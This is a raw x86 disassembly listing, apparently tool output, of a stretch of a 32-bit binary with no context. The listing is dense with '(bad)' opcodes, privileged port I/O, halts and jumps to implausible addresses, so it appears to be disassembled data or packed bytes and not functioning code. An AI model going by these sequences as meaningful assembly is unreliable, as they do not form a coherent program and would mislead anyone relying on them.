  415519:	cmp    dl,BYTE PTR [eax]
  41551b:	mov    WORD PTR [esi-0x49],ss
  41551e:	or     eax,0x7f0b7b3c
  415523:	xchg   ebx,eax
  415524:	test   eax,edi
  415526:	mov    dl,BYTE PTR [esi]
  415528:	and    eax,0x60f4940d
  41552d:	cld    
  41552e:	in     eax,dx
  41552f:	xchg   esi,eax
  415530:	xchg   ebp,eax
  415531:	xchg   edi,eax
  415532:	into   
  415533:	out    0xb6,eax
  415535:	repnz xor dx,WORD PTR [edi+0x47]
  41553a:	mov    bh,0x17
  41553c:	add    ah,BYTE PTR [edx+0x2a4fe7d1]
  415542:	out    0x9f,al
  415544:	inc    edx
  415545:	push   0x33f62970
  41554a:	xor    ecx,DWORD PTR [edi]
  41554c:	push   edx
  41554d:	fldcw  WORD PTR [esi-0x1f]
  415550:	inc    eax
  415551:	ds cmc 
  415553:	(bad)
  415557:	out    0xd4,al
  415559:	ret    0x974a
  41555c:	jae    0x415589
  41555e:	push   ss
  41555f:	jmp    0x4155ac
  415561:	fcom   QWORD PTR [ebx+0x5bad3ca5]
  415567:	push   es
  415568:	jb     0x4155b5
  41556a:	xchg   edx,eax
  41556b:	(bad)  
  41556c:	mov    cl,0xea
  41556e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41556f:	in     eax,dx
  415570:	dec    edi
  415571:	add    ch,BYTE PTR ds:0xef5f0438
  415577:	push   ecx
  415578:	call   edx
  41557a:	and    DWORD PTR [eax],ebx
  41557c:	(bad)  
  41557d:	shr    DWORD PTR [ebp-0x5e92c0f9],1
  415583:	mov    eax,0x7dd8f1f4
  415588:	add    eax,0x226a543b
  41558d:	sti    
  41558e:	xor    eax,0x5558d562
  415593:	jae    0x41555e
  415595:	stos   BYTE PTR es:[edi],al
  415596:	aaa    
  415597:	std    
  415598:	mov    dh,0xd8
  41559a:	jno    0x41560f
  41559c:	shr    DWORD PTR [edi+0x6],cl
  41559f:	dec    esp
  4155a0:	sub    dh,BYTE PTR [ebp-0x6e0729ad]
  4155a6:	inc    ebp
  4155a7:	push   cs
  4155a8:	mov    DWORD PTR [ebp+0x2756be87],ebx
  4155ae:	pushf  
  4155af:	xlat   BYTE PTR ds:[ebx]
  4155b0:	pop    edi
  4155b1:	dec    ebp
  4155b2:	dec    ebp
  4155b3:	pop    ebx
  4155b4:	into   
  4155b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b6:	rol    DWORD PTR ds:0x31238c0,cl
  4155bc:	pop    ebx
  4155bd:	push   ds
  4155be:	les    edx,FWORD PTR [ebx+0x4c]
  4155c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155c2:	ins    BYTE PTR es:[edi],dx
  4155c3:	and    dl,BYTE PTR [eax*8-0x19ae99b6]
  4155ca:	push   esi
  4155cb:	fisttp DWORD PTR [ebx]
  4155cd:	outs   dx,DWORD PTR ds:[esi]
  4155ce:	push   edi
  4155cf:	fwait
  4155d0:	loope  0x4155b4
  4155d2:	hlt    
  4155d3:	xchg   DWORD PTR [eax-0x59],ecx
  4155d6:	loop   0x415607
  4155d8:	mov    dl,0xdf
  4155da:	pop    edx
  4155db:	sbb    BYTE PTR [eax+0x3e],al
  4155de:	xchg   ecx,eax
  4155df:	or     dl,dl
  4155e1:	mov    edx,0xc5533255
  4155e6:	mov    ah,BYTE PTR [esi+0x3a]
  4155e9:	shr    BYTE PTR [edx+esi*4],0x86
  4155ed:	paddusb mm2,QWORD PTR [ebx+0x1644a490]
  4155f4:	test   eax,0xf7a94d1
  4155f9:	mov    dl,0xcc
  4155fb:	add    DWORD PTR [edi+edx*4-0x25a12a99],0xad0ff52b
  415606:	test   al,0x53
  415608:	push   edi
  415609:	push   0xbf9b9567
  41560e:	fistp  QWORD PTR [edi]
  415610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415611:	fwait
  415612:	popa   
  415613:	mov    ebx,0x5afa7bc5
  415618:	in     al,0xcd
  41561a:	and    ax,0x9af4
  41561e:	into   
  41561f:	push   cs
  415620:	outs   dx,DWORD PTR ds:[esi]
  415621:	pop    edi
  415622:	ins    DWORD PTR es:[edi],dx
  415623:	into   
  415624:	add    DWORD PTR [esp+edi*1+0x32614173],edx
  41562b:	in     eax,0xd8
  41562d:	jnp    0x415628
  41562f:	loopne 0x4155c5
  415631:	icebp  
  415632:	call   0x2b2c342b
  415637:	mov    eax,ds:0x63820849
  41563c:	xchg   ebx,eax
  41563d:	scas   eax,DWORD PTR es:[edi]
  41563e:	mov    ecx,0xa0c6fc2e
  415643:	test   al,0x39
  415645:	loop   0x415685
  415647:	push   esp
  415648:	mov    BYTE PTR [eax-0x46],bh
  41564b:	push   eax
  41564c:	sbb    ch,bl
  41564e:	cmp    BYTE PTR [esp+edi*2-0x78a4a841],cl
  415655:	xor    al,0x60
  415657:	fisubr DWORD PTR [edx-0x12]
  41565a:	pop    ss
  41565b:	xor    ebx,ebx
  41565d:	mov    esi,0x9c084ba0
  415662:	add    dh,bl
  415664:	lds    edi,FWORD PTR [eax-0x3ba38642]
  41566a:	ins    DWORD PTR es:[edi],dx
  41566b:	cmp    ecx,DWORD PTR [eax-0x53]
  41566e:	push   ecx
  41566f:	repnz (bad) 
  415671:	or     bl,BYTE PTR [ecx-0x5c]
  415674:	sub    ah,dh
  415676:	xor    al,0xb3
  415678:	es push cs
  41567a:	repz pop ebp
  41567c:	jmp    0x41569d
  41567e:	sbb    ch,bh
  415680:	mov    esi,0xb3f6a2a
  415685:	inc    esp
  415686:	xchg   edx,eax
  415687:	sbb    BYTE PTR [ebx-0x32],0xc4
  41568b:	shr    ecx,1
  41568d:	sbb    BYTE PTR [edi],al
  41568f:	cmp    al,0xbd
  415691:	mov    WORD PTR [edi],ds
  415693:	les    eax,FWORD PTR [ecx+0x2d]
  415696:	fxam   
  415698:	adc    DWORD PTR [ecx-0x75],ecx
  41569b:	hlt    
  41569c:	outs   dx,BYTE PTR ds:[esi]
  41569d:	in     al,dx
  41569e:	clc    
  41569f:	xor    DWORD PTR [eax-0x7],edx
  4156a2:	cmp    al,0xf9
  4156a4:	pop    ds
  4156a5:	icebp  
  4156a6:	std    
  4156a7:	jle    0x4156b4
  4156a9:	xor    ecx,edi
  4156ab:	popf   
  4156ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ad:	sub    ch,BYTE PTR [ebx]
  4156af:	sub    bh,BYTE PTR [eax-0x5e05c653]
  4156b5:	xor    DWORD PTR ds:0x4159d61b,ebp
  4156bb:	push   ebx
  4156bc:	inc    esi
  4156bd:	pop    es
  4156be:	or     DWORD PTR [ecx+0x6c],esi
  4156c1:	add    DWORD PTR [edx-0x6b9ddc6a],ebx
  4156c7:	dec    ebp
  4156c8:	mov    ch,0xcc
  4156ca:	pop    ebx
  4156cb:	mov    eax,0x1c12acde
  4156d0:	bound  ebp,QWORD PTR [edi-0x4187543d]
  4156d6:	sbb    al,BYTE PTR [ebp+0x6f712aa8]
  4156dc:	pop    ecx
  4156dd:	pushf  
  4156de:	(bad)
  4156e2:	lock cwde 
  4156e4:	stos   DWORD PTR es:[edi],eax
  4156e5:	addr16 sub eax,0x280947d3
  4156eb:	popf   
  4156ec:	lahf   
  4156ed:	add    DWORD PTR [edx],ebx
  4156ef:	aam    0xbc
  4156f1:	mov    BYTE PTR [ebx-0x25dddffb],cl
  4156f7:	cld    
  4156f8:	xchg   ebp,eax
  4156f9:	loope  0x41571f
  4156fb:	stos   DWORD PTR es:[edi],eax
  4156fc:	test   BYTE PTR [edi],al
  4156fe:	mov    fs,WORD PTR [esi-0x4e1bd7f7]
  415704:	sub    dl,BYTE PTR [ebp-0x17]
  415707:	js     0x415724
  415709:	sti    
  41570a:	xchg   esi,eax
  41570b:	jne    0x4156dc
  41570d:	bound  ebp,QWORD PTR [ebx]
  41570f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415710:	daa    
  415711:	add    DWORD PTR [ebx-0xd],ecx
  415714:	jmp    FWORD PTR [esi]
  415716:	in     al,0x46
  415718:	pop    es
  415719:	(bad)  
  41571c:	or     al,0xf7
  41571e:	adc    ah,BYTE PTR [ecx-0x70271ae3]
  415724:	mov    ebp,0xfef7c63b
  415729:	sbb    esp,DWORD PTR [eax+0x57354164]
  41572f:	ins    DWORD PTR es:[edi],dx
  415730:	repnz push esp
  415732:	jbe    0x4156bb
  415734:	mov    esi,0x8cd24c39
  415739:	out    dx,eax
  41573a:	lods   al,BYTE PTR ds:[esi]
  41573b:	or     al,0x67
  41573d:	add    al,0x46
  41573f:	dec    edx
  415740:	or     eax,ebx
  415742:	repz pop ecx
  415744:	sbb    eax,0xe1b9f6e4
  415749:	loopne 0x4157ab
  41574b:	xchg   edi,eax
  41574c:	test   DWORD PTR [ebp+0x54],0xd130e307
  415753:	mov    dh,0xc8
  415755:	sbb    al,0xfa
  415757:	pusha  
  415758:	sti    
  415759:	fisttp QWORD PTR [eax]
  41575b:	loop   0x415717
  41575d:	mov    edi,0xd3da4ace
  415762:	pop    ecx
  415763:	sar    DWORD PTR [ebp+0x697e6625],cl
  415769:	mov    esp,0x1d5206c5
  41576e:	mov    esp,0xce108f97
  415773:	mov    ebp,0xcac7d4f4
  415778:	jno    0x415785
  41577a:	fcom   QWORD PTR [ecx-0x36980887]
  415780:	in     eax,dx
  415781:	daa    
  415782:	popf   
  415783:	inc    eax
  415784:	jp     0x4157b1
  415786:	sub    al,0x43
  415788:	sub    dh,ch
  41578a:	(bad)  
  41578b:	fbld   TBYTE PTR [esi]
  41578d:	shl    BYTE PTR [ebx],1
  41578f:	out    0x60,eax
  415791:	inc    ebp
  415792:	in     eax,dx
  415793:	cwde   
  415794:	adc    BYTE PTR [ebx+0x5b41c521],ch
  41579a:	imul   esp,DWORD PTR [edx-0x61],0x4c
  41579e:	fisub  WORD PTR [esi]
  4157a0:	popf   
  4157a1:	xchg   esp,eax
  4157a2:	pop    edi
  4157a3:	hlt    
  4157a4:	stc    
  4157a5:	cs adc dh,ah
  4157a8:	and    DWORD PTR [edi-0x29be77bf],edx
  4157ae:	leave  
  4157af:	dec    eax
  4157b0:	cmp    ecx,ecx
  4157b2:	mov    ebp,0xd9dca083
  4157b7:	jns    0x415766
  4157b9:	sti    
  4157ba:	(bad)  
  4157bb:	xor    eax,0x26502a6c
  4157c0:	jmp    0x985f7fb9
  4157c5:	and    eax,DWORD PTR [esi]
  4157c7:	rol    BYTE PTR [eax-0x25],0x9e
  4157cb:	adc    dl,dh
  4157cd:	(bad)  
  4157ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cf:	into   
  4157d0:	jmp    0x12e5:0x990c683e
  4157d7:	test   DWORD PTR [ecx+edx*4-0x737f6018],edx
  4157de:	test   eax,0xdcf6968d
  4157e3:	mov    al,ds:0xb1e89371
  4157e8:	in     eax,dx
  4157e9:	jle    0x4157a0
  4157eb:	xlat   BYTE PTR ds:[ebx]
  4157ec:	call   0x8a84f867
  4157f1:	jae    0x41578f
  4157f3:	addr16 jno 0x4157bb
  4157f6:	xchg   esi,eax
  4157f7:	cmp    esi,0xa716ec3e
  4157fd:	fmul   DWORD PTR [esi+0x3d]
  415800:	imul   BYTE PTR [edi]
  415802:	add    edx,eax
  415804:	sbb    dh,BYTE PTR [esi]
  415806:	iret   
  415807:	jo     0x415840
  415809:	jns    0x415867
  41580b:	out    dx,al
  41580c:	xchg   esi,eax
  41580d:	push   edx
  41580e:	mov    dh,0x62
  415810:	sbb    DWORD PTR [esi+0x5],ebx
  415813:	dec    edx
  415814:	xchg   esi,eax
  415815:	jnp    0x4157ca
  415817:	imul   ebp,DWORD PTR [esi-0x31],0xfffffff8
  41581b:	test   bh,ah
  41581d:	pop    ss
  41581e:	jmp    0x415833
  415820:	push   ds
  415821:	pop    esp
  415822:	push   es
  415823:	add    edi,ebx
  415825:	data16 jns 0x41585e
  415828:	mov    ds,ecx
  41582a:	adc    ah,BYTE PTR [esi]
  41582c:	mov    bh,cl
  41582e:	(bad)  
  41582f:	lahf   
  415830:	stos   DWORD PTR es:[edi],eax
  415831:	les    ecx,FWORD PTR [edi-0x54f67961]
  415837:	sbb    eax,0x796bbf0f
  41583c:	in     al,0xd3
  41583e:	in     eax,0x41
  415840:	hlt    
  415841:	test   eax,0xa1e85d02
  415846:	push   esp
  415847:	pop    ecx
  415848:	gs inc esi
  41584a:	inc    ebx
  41584b:	sub    dl,BYTE PTR [edi+0x8]
  41584e:	jle    0x415821
  415850:	sub    eax,0x1791a549
  415855:	dec    ecx
  415856:	sbb    eax,0x22c16ad5
  41585b:	imul   ecx,esi,0x0
  41585e:	mov    ebx,0x76d52d2e
  415863:	hlt    
  415864:	mov    esi,0xfacc19fd
  415869:	out    0x96,al
  41586b:	cli    
  41586c:	and    BYTE PTR [edi],bl
  41586e:	es out dx,eax
  415870:	stos   BYTE PTR es:[edi],al
  415871:	fs adc al,0x98
  415874:	mov    ecx,0x958653a5
  415879:	popa   
  41587a:	jne    0x415862
  41587c:	rcl    ebp,1
  41587e:	shr    al,0xd4
  415881:	ret    0x4de8
  415884:	or     eax,0xd5e961cb
  415889:	nop
  41588a:	jnp    0x41581f
  41588c:	sub    dl,BYTE PTR [edx+0x249f8613]
  415892:	stos   BYTE PTR es:[edi],al
  415893:	out    dx,al
  415894:	pusha  
  415895:	inc    edi
  415896:	and    BYTE PTR [ecx],al
  415898:	inc    esi
  415899:	push   ss
  41589a:	sti    
  41589b:	pop    ds
  41589c:	or     ch,BYTE PTR [esi]
  41589e:	push   ss
  41589f:	mov    edi,0x72efd710
  4158a4:	stos   BYTE PTR es:[edi],al
  4158a5:	sahf   
  4158a6:	inc    ebx
  4158a7:	loopne 0x4158b6
  4158a9:	xor    edx,DWORD PTR [edx+0x9]
  4158ac:	jl     0x415897
  4158ae:	fwait
  4158af:	mov    al,dh
  4158b1:	jg     0x41586b
  4158b3:	xor    ecx,edi
  4158b5:	mov    ch,0x16
  4158b7:	push   ecx
  4158b8:	jge    0x41583d
  4158ba:	sub    DWORD PTR [eax-0xaa2711f],ecx
  4158c0:	dec    edx
  4158c1:	push   0xcc6d4ddf
  4158c6:	cli    
  4158c7:	sbb    al,BYTE PTR [esi+0x3d]
  4158ca:	and    al,0xf3
  4158cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158cd:	and    al,0x86
  4158cf:	or     esi,ebx
  4158d1:	or     esp,ebp
  4158d3:	sub    eax,0x2299d896
  4158d8:	imul   ebp,DWORD PTR [esp+edx*8-0x2664b8d7],0xffffffca
  4158e0:	jae    0x4158dd
  4158e2:	jnp    0x41590f
  4158e4:	cmp    edx,edx
  4158e6:	fisttp DWORD PTR [esi+0x364ecdcd]
  4158ec:	mov    al,ds:0x5382fbd9
  4158f1:	cdq    
  4158f2:	mov    ah,0x34
  4158f4:	or     ebx,DWORD PTR ds:0x8dd31cce
  4158fa:	or     bl,BYTE PTR [ecx+0x45]
  4158fd:	cmp    bh,bl
  4158ff:	out    0x39,eax
  415901:	and    al,0xfe
  415903:	nop
  415904:	(bad)  
  415905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415906:	mov    esi,0xf46cf443
  41590b:	jne    0x415957
  41590d:	sub    BYTE PTR [eax-0x1c],0x8e
  415911:	leave  
  415912:	adc    ch,0xe3
  415915:	out    dx,eax
  415916:	test   al,0x5f
  415918:	cmp    eax,0xb81dfd85
  41591d:	pusha  
  41591e:	sar    DWORD PTR [ebx-0x6],1
  415921:	mov    al,0x3b
  415923:	cmp    DWORD PTR [eax+0x4a],ebp
  415926:	sub    DWORD PTR [esi+0x69],eax
  415929:	(bad)  
  41592a:	pusha  
  41592b:	push   ds
  41592c:	aad    0x2c
  41592e:	add    BYTE PTR [ebx+0x4f],dl
  415931:	test   eax,0xe3836b18
  415936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415938:	mov    dh,0x18
  41593a:	stos   DWORD PTR es:[edi],eax
  41593b:	sar    BYTE PTR gs:[edx],1
  41593e:	mov    edi,0xc9237aa5
  415943:	dec    esp
  415944:	cmp    cl,ch
  415946:	jge    0x415954
  415948:	pop    ecx
  415949:	fld    DWORD PTR [ecx+0x73]
  41594c:	repnz rol edx,cl
  41594f:	in     al,0x9e
  415951:	or     eax,0x7d898420
  415956:	mov    ch,0x50
  415958:	push   ecx
  415959:	xchg   edx,eax
  41595a:	pushf  
  41595b:	sbb    DWORD PTR [edx+esi*8+0x19],ecx
  41595f:	dec    eax
  415960:	add    BYTE PTR [eax-0x14],dl
  415963:	cmp    DWORD PTR [eax-0x54],edi
  415966:	adc    cl,BYTE PTR [edi]
  415968:	jmp    0x6aedb83f
  41596d:	out    0x1a,al
  41596f:	(bad)  
  415971:	add    DWORD PTR [ecx],edi
  415973:	ja     0x415937
  415975:	add    dh,BYTE PTR [ecx-0x53]
  415978:	dec    edi
  415979:	gs or  dh,cl
  41597c:	in     eax,dx
  41597d:	dec    ecx
  41597e:	ror    DWORD PTR [edx-0x28],cl
  415981:	fs leave 
  415983:	popf   
  415984:	mov    bh,0xb2
  415986:	test   BYTE PTR [ecx+0x59],dh
  415989:	pop    ecx
  41598a:	or     bh,BYTE PTR [esi+0x1]
  41598d:	icebp  
  41598e:	push   es
  41598f:	in     eax,dx
  415990:	mov    al,fs:0x2658f7bc
  415996:	pop    ecx
  415997:	jae    0x415959
  415999:	add    ebp,esp
  41599b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41599c:	add    al,0x84
  41599e:	add    al,0xd5
  4159a0:	add    dl,BYTE PTR [edx]
  4159a2:	call   0xcce1:0x5e916839
  4159a9:	test   eax,0x30fbfea4
  4159ae:	jp     0x41599a
  4159b0:	inc    ebx
  4159b1:	(bad)  
  4159b2:	rcl    DWORD PTR [esi-0x32],cl
  4159b5:	add    bl,BYTE PTR [edi]
  4159b7:	ds daa 
  4159b9:	jo     0x4159cc
  4159bb:	cmc    
  4159bc:	or     al,0xc2
  4159be:	dec    ebx
  4159bf:	jge    0x415a03
  4159c1:	xor    dh,BYTE PTR [eax-0x4442e00c]
  4159c7:	hlt    
  4159c8:	inc    esp
  4159c9:	jp     0x415975
  4159cb:	adc    ebx,DWORD PTR [ebx]
  4159cd:	ffree  st(3)
  4159cf:	jg     0x4159ba
  4159d1:	jbe    0x415965
  4159d3:	fisttp QWORD PTR [ecx+ebp*1+0x2a1bd295]
  4159da:	fiadd  WORD PTR ds:0xa2c10f3f
  4159e0:	aas    
  4159e1:	daa    
  4159e2:	stos   BYTE PTR es:[edi],al
  4159e3:	jne    0x415a39
  4159e5:	sub    al,0x2d
  4159e7:	cmp    eax,0x3a36965
  4159ec:	xchg   dl,dh
  4159ee:	outs   dx,BYTE PTR ds:[esi]
  4159ef:	mov    al,0xca
  4159f1:	repz iret 
  4159f3:	inc    ecx
  4159f4:	pusha  
  4159f5:	mov    ds:0x43295647,eax
  4159fa:	cmp    al,0xb3
  4159fc:	outs   dx,DWORD PTR ds:[esi]
  4159fd:	and    dl,BYTE PTR [bp+di-0x522]
  415a02:	icebp  
  415a03:	lahf   
  415a04:	mov    ebp,0xbd46fcf7
  415a09:	cmp    ebx,ebx
  415a0b:	cwde   
  415a0c:	arpl   WORD PTR [edx+ecx*2],si
  415a0f:	xor    BYTE PTR [esp+esi*1+0x1fd41398],dl
  415a16:	push   ecx
  415a17:	ret    0x3e9c
  415a1a:	push   ebp
  415a1b:	adc    bl,ah
  415a1d:	test   eax,0x68e0d615
  415a22:	jmp    0xd3188c56
  415a27:	das    
  415a28:	sub    eax,0x12463ae8
  415a2d:	fcomip st,st(1)
  415a2f:	cmp    eax,0x2d78199d
  415a34:	mov    al,ds:0xb1befaea
  415a39:	and    al,0x8e
  415a3b:	ins    DWORD PTR es:[edi],dx
  415a3c:	scas   eax,DWORD PTR es:[edi]
  415a3d:	cmp    ebx,DWORD PTR [esi+0x33]
  415a40:	or     al,0xf1
  415a42:	std    
  415a43:	stos   BYTE PTR es:[edi],al
  415a44:	fnstenv [edx-0x17]
  415a47:	cmp    DWORD PTR [esi-0x26],0x4d
  415a4b:	or     eax,DWORD PTR [ebp-0x596a3ecd]
  415a51:	or     BYTE PTR [ebp+0x77b7969b],dl
  415a57:	inc    edi
  415a58:	es jg  0x415a2c
  415a5b:	or     BYTE PTR [eax],al
  415a5d:	imul   edx,DWORD PTR [edx-0x2d625d85],0x58a3e863
  415a67:	sbb    DWORD PTR [ebp-0x5f],esp
  415a6a:	xchg   DWORD PTR [ebx+edi*4],ecx
  415a6d:	les    esi,FWORD PTR fs:[edx-0x12832bdd]
  415a74:	xor    eax,0x20ac8838
  415a79:	ficomp DWORD PTR [esi+esi*4]
  415a7c:	in     al,0x7a
  415a7e:	(bad)  
  415a7f:	dec    ebp
  415a80:	test   eax,0xab96d57c
  415a85:	pop    ebx
  415a86:	leave  
  415a87:	xor    eax,0xe74190e
  415a8c:	mov    esi,0xc2cecf61
  415a91:	push   ebx
  415a92:	daa    
  415a93:	sbb    bh,bl
  415a95:	xor    esi,DWORD PTR [esi]
  415a97:	scas   eax,DWORD PTR es:[edi]
  415a98:	xchg   ebp,eax
  415a99:	leave  
  415a9a:	jg     0x415af2
  415a9c:	sub    BYTE PTR [ecx-0x55c550e2],bl
  415aa2:	push   esi
  415aa3:	fs out dx,eax
  415aa5:	push   eax
  415aa6:	xor    DWORD PTR [edx+0x37741c84],ebp
  415aac:	mov    ch,al
  415aae:	div    DWORD PTR [esi-0x30]
  415ab1:	(bad)  
  415ab2:	gs in  al,0xb4
  415ab5:	sub    BYTE PTR [ebp-0x1],dl
  415ab8:	mov    DWORD PTR [edx-0x528d697b],eax
  415abe:	out    dx,eax
  415abf:	mov    edx,DWORD PTR [ebx]
  415ac1:	mul    DWORD PTR [edi+0x1d]
  415ac4:	(bad)  
  415ac5:	cs repnz push es
  415ac8:	jmp    0x43b65378
  415acd:	out    0x48,al
  415acf:	mov    ebp,0x156c0a9f
  415ad4:	lods   al,BYTE PTR ds:[esi]
  415ad5:	sub    eax,0x50036ac8
  415ada:	or     eax,0xfd18442c
  415adf:	inc    esp
  415ae0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae1:	dec    edi
  415ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ae3:	lock mov edi,DWORD PTR [ebx]
  415ae6:	add    cl,bh
  415ae8:	(bad)  
  415ae9:	es pushf 
  415aeb:	jb     0x415a8f
  415aed:	push   ds
  415aee:	inc    ebp
  415aef:	pop    edx
  415af0:	out    0x75,al
  415af2:	or     dl,al
  415af4:	pop    edi
  415af5:	int    0xa2
  415af7:	add    DWORD PTR [edi+0x4b7d9604],edi
  415afd:	add    eax,0x730f1769
  415b02:	std    
  415b03:	loop   0x415b03
  415b05:	pop    ss
  415b06:	and    BYTE PTR [ebx+0x28410d25],ah
  415b0c:	pushf  
  415b0d:	jns    0x415ac7
  415b0f:	loope  0x415b06
  415b11:	xchg   edx,eax
  415b12:	icebp  
  415b13:	jp     0x415b8d
  415b15:	add    eax,0xa84b214c
  415b1a:	pop    edx
  415b1b:	xor    dl,0x23
  415b1e:	dec    eax
  415b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b20:	lahf   
  415b21:	cmp    BYTE PTR [edx-0x38],0x4d
  415b25:	and    esi,DWORD PTR [esi-0x6d]
  415b28:	ins    BYTE PTR es:[edi],dx
  415b29:	mov    eax,0x1b77bee1
  415b2e:	mul    BYTE PTR [esi-0x170c2556]
  415b34:	ja     0x415b70
  415b36:	cmp    BYTE PTR [ecx-0x2d],0x2
  415b3a:	in     al,dx
  415b3b:	pop    ecx
  415b3c:	aad    0x8b
  415b3e:	pushf  
  415b3f:	mov    eax,ds:0x3de422a4
  415b44:	mov    ds:0x7dac13f8,eax
  415b49:	rol    DWORD PTR [esi-0x1fd47f75],cl
  415b4f:	cli    
  415b50:	push   cs
  415b51:	int3   
  415b52:	and    BYTE PTR [ebp-0x378eb77d],bl
  415b58:	adc    al,0x88
  415b5a:	inc    esi
  415b5b:	mov    ch,0xdf
  415b5d:	int    0xec
  415b5f:	cmp    ebx,ebx
  415b61:	xchg   edi,eax
  415b62:	add    DWORD PTR [ebx],0x864ce231
  415b68:	mov    eax,ds:0x12759a28
  415b6d:	mov    edx,0xbf12e388
  415b72:	test   DWORD PTR [ecx-0x13],0x93245193
  415b79:	cmp    ah,BYTE PTR [ebx-0x72]
  415b7c:	es es gs scas eax,DWORD PTR es:[edi]
  415b80:	add    edi,ecx
  415b82:	(bad)  
  415b83:	aad    0x56
  415b85:	popf   
  415b86:	mov    ebx,0x17c44d7a
  415b8b:	fist   DWORD PTR [edx+ebx*4-0x29]
  415b8f:	call   0xd7f4c53c
  415b94:	ja     0x415b65
  415b96:	push   0xffffff96
  415b98:	push   0xffffff9a
  415b9a:	movlps xmm6,QWORD PTR [edx]
  415b9d:	outs   dx,BYTE PTR ds:[esi]
  415b9e:	inc    ebx
  415b9f:	jle    0x415b6e
  415ba1:	add    ebx,DWORD PTR [esi+0x2d205f02]
  415ba7:	(bad)  
  415ba9:	mov    ch,0x95
  415bab:	outs   dx,DWORD PTR ds:[esi]
  415bac:	xchg   ecx,eax
  415bad:	ret    
  415bae:	mov    ah,0xa8
  415bb0:	jge    0x415b7a
  415bb2:	test   ecx,ebp
  415bb4:	xor    al,0x12
  415bb6:	retf   0x4402
  415bb9:	les    edx,FWORD PTR [si-0x53f5]
  415bbe:	aas    
  415bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bc0:	or     al,BYTE PTR [ebx+0x17ac0b5d]
  415bc6:	and    eax,0xdd2e2280
  415bcb:	mov    ebx,0x7eb55515
  415bd0:	int    0x55
  415bd2:	neg    BYTE PTR [edi]
  415bd4:	test   DWORD PTR [ecx-0x1d8df395],edi
  415bda:	push   ecx
  415bdb:	mov    esi,0xaa43ac64
  415be0:	test   eax,0x770cfe84
  415be5:	sbb    DWORD PTR cs:[ecx],ebx
  415be8:	stos   DWORD PTR es:[edi],eax
  415be9:	mov    eax,ds:0xd8a58868
  415bee:	push   eax
  415bef:	xlat   BYTE PTR ds:[ebx]
  415bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf1:	add    DWORD PTR [ebx+0x9],ebp
  415bf4:	dec    esp
  415bf5:	mov    dl,0x77
  415bf7:	push   0xffffffd4
  415bf9:	pop    ecx
  415bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bfb:	jecxz  0x415bb8
  415bfd:	retf   
  415bfe:	repz mov ebx,0xd76e682f
  415c04:	mov    ds:0xbbaa2df,eax
  415c09:	xor    al,0xe5
  415c0b:	jp     0x415c61
  415c0d:	call   0xcc9541a4
  415c12:	cmp    DWORD PTR [esi+ebp*1],eax
  415c15:	loope  0x415c4f
  415c17:	adc    DWORD PTR [esi+0x49],ecx
  415c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c1b:	test   ch,al
  415c1d:	out    0x5d,al
  415c1f:	rcr    WORD PTR [esi-0xe],0xc0
  415c24:	mov    ds:0x1da006a7,eax
  415c29:	icebp  
  415c2a:	cmovbe ebx,esi
  415c2d:	sub    dh,BYTE PTR [ecx-0x56]
  415c30:	push   0xffffffb2
  415c32:	or     eax,0xacce40d3
  415c37:	add    ch,bh
  415c39:	push   cs
  415c3a:	mov    edx,0xdd85ce64
  415c3f:	jne    0x415c8b
  415c41:	push   eax
  415c42:	adc    al,0xbf
  415c44:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c46:	inc    esi
  415c47:	jnp    0x415bef
  415c49:	cli    
  415c4a:	hlt    
  415c4b:	pop    esp
  415c4c:	fdivp  st(6),st
  415c4e:	or     eax,0xe05f674a
  415c53:	xchg   ecx,eax
  415c54:	inc    edx
  415c55:	ss int 0x48
  415c58:	xchg   DWORD PTR [edi+0x5ba1a844],esp
  415c5e:	and    DWORD PTR [eax],esp
  415c60:	jns    0x415c08
  415c62:	lahf   
  415c63:	int    0x16
  415c65:	out    0xf0,al
  415c67:	icebp  
  415c68:	std    
  415c69:	mov    bh,0xc2
  415c6b:	or     BYTE PTR [ebx],cl
  415c6d:	cmp    eax,0xe5770a3c
  415c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c73:	nop
  415c74:	cmp    DWORD PTR [ebx-0x65],0x4e
  415c78:	pop    esp
  415c79:	fwait
  415c7a:	inc    edi
  415c7b:	and    ebx,eax
  415c7d:	ins    DWORD PTR es:[edi],dx
  415c7e:	(bad)  
  415c7f:	cmp    BYTE PTR [eax-0xb],bl
  415c82:	int3   
  415c83:	adc    eax,0x4e600a99
  415c88:	repz sar BYTE PTR [edx-0x57],0xa6
  415c8d:	add    al,0xe1
  415c8f:	in     eax,0xac
  415c91:	mov    ebx,0xe240e3fc
  415c96:	fnstcw WORD PTR [ebp+edi*8-0x4cc15e74]
  415c9d:	inc    esp
  415c9e:	loop   0x415c62
  415ca0:	push   ebx
  415ca1:	clc    
  415ca2:	inc    ebp
  415ca3:	(bad)  
  415ca4:	sti    
  415ca5:	dec    eax
  415ca6:	sbb    ecx,DWORD PTR ds:0xb8bdac1d
  415cac:	cmp    edx,ecx
  415cae:	shl    BYTE PTR [edi],0x90
  415cb1:	adc    bl,BYTE PTR [edx+0x61]
  415cb4:	and    eax,0x96c7b05
  415cb9:	imul   edi,DWORD PTR [edx+0x43af8328],0x618d33d8
  415cc3:	mov    ecx,0x381a5c
  415cc8:	lods   al,BYTE PTR ds:[esi]
  415cc9:	lods   eax,DWORD PTR ss:[esi]
  415ccb:	pop    eax
